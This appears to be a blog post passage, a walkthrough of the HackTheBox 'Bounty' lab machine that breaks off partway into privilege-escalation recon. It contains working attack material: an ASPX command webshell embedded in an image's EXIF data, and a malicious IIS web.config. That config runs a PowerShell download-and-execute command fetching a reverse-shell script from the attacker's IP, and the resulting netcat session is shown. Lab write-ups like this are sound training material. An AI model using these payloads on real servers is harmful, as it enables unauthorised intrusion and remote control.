@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Bounty | Bounty is a relatively easy box to root. I think the most tedious part is to get the initial foothold since the process requires to embed ASP...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Bounty</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-04-14 02:06:00+01:00">Tue 14 April 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Bounty.html">Bounty</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Bounty.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Bounty is a relatively easy box to root. I think the most tedious part is to get the initial foothold since the process requires to embed ASP code in a IIS configuration file, <code>web.config</code>. Once initial access is obtained the victim OS is a vanilla Win 2008 R2 which can be rooted in several ways. I did root it twice with two different methods. </p>
+<h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $nmap -sC -sV -p- 10.10.10.93</span>
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-16 11:51 BST</span>
+<span class="go">Nmap scan report for 10.10.10.93</span>
+<span class="go">Host is up (0.11s latency).</span>
+<span class="go">Not shown: 65534 filtered ports</span>
+<span class="go">PORT   STATE SERVICE VERSION</span>
+<span class="go">80/tcp open  http    Microsoft IIS httpd 7.5</span>
+<span class="go">| http-methods: </span>
+<span class="go">|_  Potentially risky methods: TRACE</span>
+<span class="go">|_http-server-header: Microsoft-IIS/7.5</span>
+<span class="go">|_http-title: Bounty</span>
+<span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 293.33 seconds</span>
+</pre></div>
+
+
+<p>Looks like we only have an IIS v7.5 httpd service running on </p>
+<p><img alt="" src="../images/bounty-iis.png"></p>
+<p>Browsing to the webpage does provide only the above image which is not very helpful. Let's see if we manage to find some directories with <code>gobuster</code>.</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $gobuster dir --url http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span>
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://10.10.10.93</span>
+<span class="go">[+] Threads:        10</span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/04/16 12:08:38 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/UploadedFiles (Status: 301)</span>
+<span class="go">/uploadedFiles (Status: 301)</span>
+<span class="go">/uploadedfiles (Status: 301)</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/04/16 12:49:14 Finished</span>
+<span class="go">===============================================================</span>
+</pre></div>
+
+
+<p>I check all the 3 directories but I got this message:</p>
+<div class="highlight"><pre><span></span><span class="go">403 - Forbidden: Access is denied.</span>
+<span class="go">You do not have permission to view this directory or page using the credentials that you supplied.</span>
+</pre></div>
+
+
+<p>I also run <code>Nikto</code> to see if I can find something interesting:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $nikto --url http://10.10.10.93</span>
+<span class="go">- Nikto v2.1.6</span>
+<span class="go">---------------------------------------------------------------------------</span>
+<span class="go">+ Target IP:          10.10.10.93</span>
+<span class="go">+ Target Hostname:    10.10.10.93</span>
+<span class="go">+ Target Port:        80</span>
+<span class="go">+ Start Time:         2020-04-16 13:50:06 (GMT1)</span>
+<span class="go">---------------------------------------------------------------------------</span>
+<span class="go">+ Server: Microsoft-IIS/7.5</span>
+<span class="go">+ Retrieved x-powered-by header: ASP.NET</span>
+<span class="go">+ The anti-clickjacking X-Frame-Options header is not present.</span>
+<span class="go">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
+<span class="go">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
+<span class="go">+ Retrieved x-aspnet-version header: 2.0.50727</span>
+<span class="go">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span>
+<span class="go">+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST </span>
+<span class="go">+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST </span>
+<span class="go">+ 7863 requests: 0 error(s) and 7 item(s) reported on remote host</span>
+<span class="go">+ End Time:           2020-04-16 14:05:31 (GMT1) (925 seconds)</span>
+<span class="go">---------------------------------------------------------------------------</span>
+<span class="go">+ 1 host(s) tested</span>
+</pre></div>
+
+
+<p>Probably the only useful info from the above output is that IIS is using ASP.net so we can expect to have asp or aspx pages.</p>
+<p>Looking for exploits with <code>searchsploit</code> I get this:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $searchsploit iis 7.5</span>
+<span class="go">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
+<span class="go"> Exploit Title                                                                                                                                                                                                                       |  Path</span>
+<span class="go">                                                                                                                                                                                                                                     | (/usr/share/exploitdb/)</span>
+<span class="go">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
+<span class="go">Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                                                                             | exploits/windows/remote/19033.txt</span>
+<span class="go">Microsoft IIS 7.5 (Windows 7) - FTPSVC Unauthorized Remote Denial of Service (PoC)                                                                                                                                                   | exploits/windows/dos/15803.py</span>
+<span class="go">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
+<span class="go">Shellcodes: No Result</span>
+</pre></div>
+
+
+<p>The first one in the list could be relevant so I have a look inside (<code>searchsploit -x 19033</code>) and found this bit that is interesting:</p>
+<div class="highlight"><pre><span></span><span class="go">------------------------------------------------------------------------------------------------------------------------------------------------------------</span>
+
+<span class="go">Title: Microsoft IIS 7.5 Classic ASP Authentication Bypass</span>
+
+<span class="go">Affected Software:</span>
+<span class="go">Microsoft IIS 7.5 with configured Classic ASP and .NET Framework 4.0</span>
+<span class="go">installed (.NET Framework 2.0 is unaffected, other .NET frameworks</span>
+<span class="go">have not been tested)</span>
+<span class="gp gp-VirtualEnv">(tested on Windows 7)</span>
+
+<span class="go">Details:</span>
+<span class="go">By appending &quot;:$i30:$INDEX_ALLOCATION&quot; to the directory serving the</span>
+<span class="go">classic ASP file access restrictions can be successfully bypassed.</span>
+
+<span class="go">Take this Example:</span>
+<span class="go">1.) Microsoft IIS 7.5 has Classic ASP configured (it allows serving .asp files)</span>
+<span class="go">2.) There is a password protected directory configured that has</span>
+<span class="go">administrative asp scripts inside</span>
+<span class="go">3.) An attacker requests the directory with :$i30:$INDEX_ALLOCATION</span>
+<span class="go">appended to the directory name</span>
+<span class="go">4.) IIS/7.5 gracefully executes the ASP script without asking for</span>
+<span class="go">proper credentials</span>
+
+<span class="go">------------------------------------------------------------------------------------------------------------------------------------------------------------</span>
+</pre></div>
+
+
+<p>I tried to append this to the <code>UploadedFiles</code> directory found with gobuster but didn't get anywhere.</p>
+<p>Since we know about ASP.NET being used I decided to do another scan with gobuster including more extensions (adding the <code>-x asp,aspx</code> option):</p>
+<p>The search yielded two additional results, <code>apsnet_client</code> and <code>transfer.aspx</code>. When checking with a browser, <code>aspnet_client</code> gave the same permission error as <code>UploadedFiles</code>, whereas <code>transfer.aspx</code> showed this:</p>
+<p><img alt="" src="../images/bounty-transfer.png"></p>
+<p>Now the first thought is "Cool, let's upload a shell" which is fair. However, we need to see what kind of files can be uploaded. In this scenario we would better use an aspx shell but before we generate the shell let's verify we can upload a dummy aspx file. I create a file called <code>bounty.aspx</code> which contains some text. Then when I try to upload it I get the error:</p>
+<p><code>Invalid File. Please try again</code></p>
+<p>I then open <code>Burp</code> to catch the POST request sent to the web server for the file upload:</p>
+<div class="highlight"><pre><span></span><span class="go">POST /transfer.aspx HTTP/1.1</span>
+<span class="go">Host: 10.10.10.93</span>
+<span class="go">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="go">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="go">Accept-Language: en-US,en;q=0.5</span>
+<span class="go">Accept-Encoding: gzip, deflate</span>
+<span class="go">Content-Type: multipart/form-data; boundary=---------------------------1317515723955044403533213944</span>
+<span class="go">Content-Length: 837</span>
+<span class="go">Origin: http://10.10.10.93</span>
+<span class="go">DNT: 1</span>
+<span class="go">Connection: close</span>
+<span class="go">Referer: http://10.10.10.93/transfer.aspx</span>
+<span class="go">Upgrade-Insecure-Requests: 1</span>
+
+<span class="go">-----------------------------1317515723955044403533213944</span>
+<span class="go">Content-Disposition: form-data; name=&quot;__VIEWSTATE&quot;</span>
+
+<span class="go">/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YRYCAgUPDxYGHgRUZXh0BR5JbnZhbGlkIEZpbGUuIFBsZWFzZSB0cnkgYWdhaW4eCUZvcmVDb2xvcgqNAR4EXyFTQgIEZGRkEcv0Jjmp3XbuMPOLap1nb79sh/A=</span>
+<span class="go">-----------------------------1317515723955044403533213944</span>
+<span class="go">Content-Disposition: form-data; name=&quot;__EVENTVALIDATION&quot;</span>
+
+<span class="go">/wEWAgLAitHnCwLt3oXMA6hPklThrKieTzE01/4B0zpapoWd</span>
+<span class="go">-----------------------------1317515723955044403533213944</span>
+<span class="go">Content-Disposition: form-data; name=&quot;FileUpload1&quot;; filename=&quot;bounty.aspx&quot;</span>
+<span class="go">Content-Type: text/plain</span>
+
+<span class="go">Hello World</span>
+
+<span class="go">-----------------------------1317515723955044403533213944</span>
+<span class="go">Content-Disposition: form-data; name=&quot;btnUpload&quot;</span>
+
+<span class="go">Upload</span>
+<span class="go">-----------------------------1317515723955044403533213944--</span>
+</pre></div>
+
+
+<p>Now I send this request to the repeater and I change the <code>filename="bounty.aspx"</code> trying different extensions. When I try, for example, <code>filename="bounty.jpg</code> I get a successful response:</p>
+<p><code>File uploaded successfully</code></p>
+<p>I suspect that the <code>UploadedFile</code> directory we saw earlier will be the location where the files, once uploaded, will end up. So I create a jpg with the HTB logo and upload it. Then I check the directory and I get this:</p>
+<p><img alt="" src="../images/bounty-upload-test.png"></p>
+<p>this confirms the suspicion. </p>
+<p>Now, I need to find a way to upload something that can get me code execution. I explored the option of embedding aspx code within a jpg with <code>exiftool</code>. I basically took a cmdasp shell available in my ParrotOS box at <code>/usr/share/webshells/aspx/cmdasp.aspx</code>, I edited a bit the code making it a oneliner and making sure to escape the <code>C#</code> code with <code>\</code>, then run <code>exiftool</code> as follow: </p>
+<div class="highlight"><pre><span></span><span class="go">exiftool -comment=&quot;&lt;script Language=\&quot;c#\&quot; runat=\&quot;server\&quot;&gt; void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName =\&quot;cmd.exe\&quot;;psi.Arguments =\&quot;/c \&quot;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(\&quot;&lt;pre&gt;\&quot;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(\&quot;&lt;/pre&gt;\&quot;);}&lt;/script&gt;&lt;HTML&gt;&lt;HEAD&gt;&lt;title&gt;awen asp.net webshell&lt;/title&gt;&lt;/HEAD&gt;&lt;body &gt;&lt;form id=\&quot;cmd\&quot; method=\&quot;post\&quot; runat=\&quot;server\&quot;&gt;&lt;asp:TextBox id=\&quot;txtArg\&quot; style=\&quot;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px\&quot; runat=\&quot;server\&quot; Width=\&quot;250px\&quot;&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=&quot;testing&quot; style=\&quot;Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px\&quot; runat=\&quot;server\&quot; Text=\&quot;excute\&quot; OnClick=\&quot;cmdExe_Click\&quot;&gt;&lt;/asp:Button&gt;&lt;asp:Label id=\&quot;lblText\&quot; style=\&quot;Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px\&quot; runat=\&quot;server\&quot;&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;&quot; htb.jpg</span>
+</pre></div>
+
+
+<p>I obtained an image called <code>htb.jpg</code> which contains the above code in the comments section. Once the image is fetched from the webpage it should execute the code in the comments. This shows the file content:</p>
+<div class="highlight"><pre><span></span><span class="go">─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bounty]</span>
+<span class="go">└──╼ $exiftool htb.jpg</span>
+<span class="go">ExifTool Version Number         : 11.93</span>
+<span class="go">File Name                       : htb.jpg</span>
+<span class="go">Directory                       : .</span>
+<span class="go">File Size                       : 8.9 kB</span>
+<span class="go">File Modification Date/Time     : 2020:04:16 23:19:09+01:00</span>
+<span class="go">File Access Date/Time           : 2020:04:16 23:19:09+01:00</span>
+<span class="go">File Inode Change Date/Time     : 2020:04:16 23:19:09+01:00</span>
+<span class="go">File Permissions                : rw-r--r--</span>
+<span class="go">File Type                       : JPEG</span>
+<span class="go">File Type Extension             : jpg</span>
+<span class="go">MIME Type                       : image/jpeg</span>
+<span class="go">JFIF Version                    : 1.01</span>
+<span class="go">Resolution Unit                 : inches</span>
+<span class="go">X Resolution                    : 96</span>
+<span class="go">Y Resolution                    : 96</span>
+<span class="go">Comment                         : &lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt; void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName =&quot;cmd.exe&quot;;psi.Arguments =&quot;/c &quot;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(&quot;&lt;pre&gt;&quot;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(&quot;&lt;/pre&gt;&quot;);}&lt;/script&gt;&lt;HTML&gt;&lt;HEAD&gt;&lt;title&gt;awen asp.net webshell&lt;/title&gt;&lt;/HEAD&gt;&lt;body &gt;&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;&lt;asp:TextBox id=&quot;txtArg&quot; style=&quot;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=testing style=&quot;Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px&quot; runat=&quot;server&quot; Text=&quot;excute&quot; OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;&lt;asp:Label id=&quot;lblText&quot; style=&quot;Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;</span>
+<span class="go">Image Width                     : 195</span>
+<span class="go">Image Height                    : 187</span>
+<span class="go">Encoding Process                : Baseline DCT, Huffman coding</span>
+<span class="go">Bits Per Sample                 : 8</span>
+<span class="go">Color Components                : 3</span>
+<span class="go">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span>
+<span class="go">Image Size                      : 195x187</span>
+<span class="go">Megapixels                      : 0.036</span>
+</pre></div>
+
+
+<p>Unfortnuately that did not work!</p>
+<p>I then found a list of most common extenions <a href="https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/filename-dirname-bruteforce/Extensions.Mostcommon.txt">here</a> and rather than trying all of them at once I will use burp to automate the process. First I insert all the extensions on a text file, then I capture the file upload POST request to burp and I pass it to the the burp Intruder module. Once in the Intruder module the request will look like the following:</p>
+<p><img alt="" src="../images/bounty-positions.png"></p>
+<p>The bit we need to change is <code>filename="htb.§PAYLOAD§"</code> where PAYLOD between these strange symbols is basically the file with the extensions I created. To tell burp which payload to use we need to move on the "Payloads" tab and load the payload as shown below:</p>
+<p><img alt="" src="../images/bounty-payload.png"></p>
+<p>After that we launch the attack and we obtain this result:</p>
+<p><img alt="" src="../images/bounty-intruder.png"></p>
+<p>We can see that all the 30 results have a code "200". I noticed that few of the extensions show a different response lenght, that is 1350 instead of 1355. Upon checking the response lenght 1350 indicates the successful upload and 1355 a failed upload. So <code>doc</code>, <code>docx</code>, <code>xls</code>, <code>xlsx</code> can be uploaded. However, I researched and explored options like I did for the <code>jpg</code> but I didn't get anywhere. </p>
+<p>At some point, while testing I forgot a quote in the filename and I got a response error as shown belog:</p>
+<p><img alt="" src="../images/bounty-error.png"></p>
+<p>The error gives some clues about a WebConfig file and after some research I found it's a typical IIS config file. I did an attempt to upload a <code>test.config</code> file and it was successful. I also found online interesting facts about malicious WebConfig files with embedded webshells. Specifically I found this <a href="https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c">page</a>. </p>
+<p>While testing I noticed that the files uploaded to the web server get deleted after a minute or so. So although getting a webshell is certainly possible I will go straight onto getting a reverse shell as it will be persistent. I explored few options and I grabbed a powershell script available in my attacking box at <code>/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1</code>. To invoke a callback to my ParrotOS box I need to add a this line at the end of the Invoke-PowerShellTcp.ps1 script:</p>
+<p><code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 443</code></p>
+<p>Then I take a simple web.config template and I add the asp code at the end in a way that once executed it calls the powershell script:</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="nt">&lt;configuration&gt;</span>
+   <span class="nt">&lt;system.webServer&gt;</span>
+      <span class="nt">&lt;handlers</span> <span class="na">accessPolicy=</span><span class="s">&quot;Read, Script, Write&quot;</span><span class="nt">&gt;</span>
+         <span class="nt">&lt;add</span> <span class="na">name=</span><span class="s">&quot;web_config&quot;</span> <span class="na">path=</span><span class="s">&quot;*.config&quot;</span> <span class="na">verb=</span><span class="s">&quot;*&quot;</span> <span class="na">modules=</span><span class="s">&quot;IsapiModule&quot;</span> <span class="na">scriptProcessor=</span><span class="s">&quot;%windir%\system32\inetsrv\asp.dll&quot;</span> <span class="na">resourceType=</span><span class="s">&quot;Unspecified&quot;</span> <span class="na">requireAccess=</span><span class="s">&quot;Write&quot;</span> <span class="na">preCondition=</span><span class="s">&quot;bitness64&quot;</span> <span class="nt">/&gt;</span>         
+      <span class="nt">&lt;/handlers&gt;</span>
+      <span class="nt">&lt;security&gt;</span>
+         <span class="nt">&lt;requestFiltering&gt;</span>
+            <span class="nt">&lt;fileExtensions&gt;</span>
+               <span class="nt">&lt;remove</span> <span class="na">fileExtension=</span><span class="s">&quot;.config&quot;</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;/fileExtensions&gt;</span>
+            <span class="nt">&lt;hiddenSegments&gt;</span>
+               <span class="nt">&lt;remove</span> <span class="na">segment=</span><span class="s">&quot;web.config&quot;</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;/hiddenSegments&gt;</span>
+         <span class="nt">&lt;/requestFiltering&gt;</span>
+      <span class="nt">&lt;/security&gt;</span>
+   <span class="nt">&lt;/system.webServer&gt;</span>
+<span class="nt">&lt;/configuration&gt;</span>
+<span class="c">&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!</span>
+<span class="c">&lt;%@ Language=VBScript %&gt;</span>
+<span class="c">&lt;%</span>
+<span class="c">  call Server.CreateObject(&quot;WSCRIPT.SHELL&quot;).Run(&quot;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.15/Invoke-PowerShellTcp.ps1&#39;)&quot;)</span>
+<span class="c">%&gt;</span>
+</pre></div>
+
+
+<p>At this state I host the poweshell script with a simple python http server and I also start a netcat listener on port 443. I then upload the <code>web.config</code> file and I browse to it, the result is the following:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~]          </span>
+<span class="go">└──╼ $sudo nc -lnvp 443                                                                                                                                            </span>
+<span class="go">[sudo] password for m4rc0:               </span>
+<span class="go">listening on [any] 443 ...          </span>
+
+<span class="go">connect to [10.10.14.15] from (UNKNOWN) [10.10.10.93] 49174</span>
+<span class="go">Windows PowerShell running as user BOUNTY$ on BOUNTY                                                                   </span>
+<span class="go">Copyright (C) 2015 Microsoft Corporation. All rights reserved.         </span>
+
+<span class="go">PS C:\windows\system32\inetsrv&gt;PS C:\windows\system32\inetsrv&gt; whoami</span>
+<span class="go">bounty\merlin                                     </span>
+</pre></div>
+
+
+<p>Finally got a reverse shell and the <code>whoami</code> command shows that I am logged in as the <code>merlin</code> user. So I move to the <code>merlin</code> Desktop to look for the flag:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\merlin\Desktop&gt; dir</span>
+<span class="go">PS C:\users\merlin\Desktop&gt;</span>
+</pre></div>
+
+
+<p>The <code>dir</code> command shows no results. Maybe the file is hidden or it is somewhere else.</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\users\merlin\Desktop&gt; dir -force</span>
+
+
+<span class="go">    Directory: C:\users\merlin\Desktop</span>
+
+
+<span class="go">Mode                LastWriteTime     Length Name                              </span>
+<span class="go">----                -------------     ------ ----                              </span>
+<span class="go">-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       </span>
+<span class="go">-a-h-         5/30/2018  11:32 PM         32 user.txt                          </span>
+
+
+<span class="go">PS C:\users\merlin\Desktop&gt; type user.txt</span>
+<span class="go">e2****************************2f</span>
+</pre></div>
+
+
+<p>In fact <code>dir -force</code> command shows the file is there and we can read it. </p>
+<p>Let's see how we can get the root flag. </p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\windows\system32\inetsrv&gt; systeminfo</span>
+
+<span class="go">Host Name:                 BOUNTY</span>
+<span class="go">OS Name:                   Microsoft Windows Server 2008 R2 Datacenter </span>
+<span class="go">OS Version:                6.1.7600 N/A Build 7600</span>
+<span class="go">OS Manufacturer:           Microsoft Corporation</span>
+<span class="go">OS Configuration:          Standalone Server</span>
+<span class="go">OS Build Type:             Multiprocessor Free</span>
+<span class="go">Registered Owner:          Windows User</span>
+<span class="go">Registered Organization:   </span>
+<span class="go">Product ID:                55041-402-3606965-84760</span>
+<span class="go">Original Install Date:     5/30/2018, 12:22:24 AM</span>
+<span class="go">System Boot Time:          4/20/2020, 5:13:21 PM</span>
+<span class="go">System Manufacturer:       VMware, Inc.</span>
+<span class="go">System Model:              VMware Virtual Platform</span>
+<span class="go">System Type:               x64-based PC</span>
+<span class="go">Processor(s):              1 Processor(s) Installed.</span>
+<span class="go">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
+<span class="go">BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018</span>
+<span class="go">Windows Directory:         C:\Windows</span>
+<span class="go">System Directory:          C:\Windows\system32</span>
+<span class="go">Boot Device:               \Device\HarddiskVolume1</span>
+<span class="go">System Locale:             en-us;English (United States)</span>
+<span class="go">Input Locale:              en-us;English (United States)</span>
+<span class="go">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul</span>
+<span class="go">Total Physical Memory:     2,047 MB</span>
+<span class="go">Available Physical Memory: 1,581 MB</span>
+<span class="go">Virtual Memory: Max Size:  4,095 MB</span>
+<span class="go">Virtual Memory: Available: 3,559 MB</span>
+<span class="go">Virtual Memory: In Use:    536 MB</span>
+<span class="go">Page File Location(s):     C:\pagefile.sys</span>
+<span class="go">Domain:                    WORKGROUP</span>
+<span class="go">Logon Server:              N/A</span>
+<span class="go">Hotfix(s):                 N/A</span>
+<span class="go">Network Card(s):           1 NIC(s) Installed.</span>
+<span class="go">                           [01]: Intel(R) PRO/1000 MT Network Connection</span>
+<span class="go">                                 Connection Name: Local Area Connection</span>
